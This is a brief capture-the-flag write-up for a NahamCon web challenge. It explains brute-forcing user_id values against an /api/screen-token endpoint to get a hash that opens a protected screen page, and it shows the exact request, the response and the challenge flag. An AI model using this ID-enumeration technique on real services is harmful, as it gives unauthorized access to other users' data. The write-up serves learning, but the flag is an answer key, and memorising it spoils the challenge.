# Solution

look into the js file at `/assets/js/app.js`,
noticed that it checks `/api/screen-token` with `user_id`,
mimic one and brute the `user_id`,


## Request
```
POST /api/screen-token/ HTTP/1.1
Host: challenge.nahamcon.com:32671


{"user_id":"7"}

```
## Response
```
HTTP/1.1 201 Created
Server: nginx/1.26.3


{"hash":"fe49e2554d481e070c213ec0b8a9113e"}

```
get the hash and go to the URL,
`http://challenge.nahamcon.com:32671/screen/?key=fe49e2554d481e070c213ec0b8a9113e`,

flag: `flag{f0b1d2a98cd92d728ddd76067f959c31}`

Solved by: ks
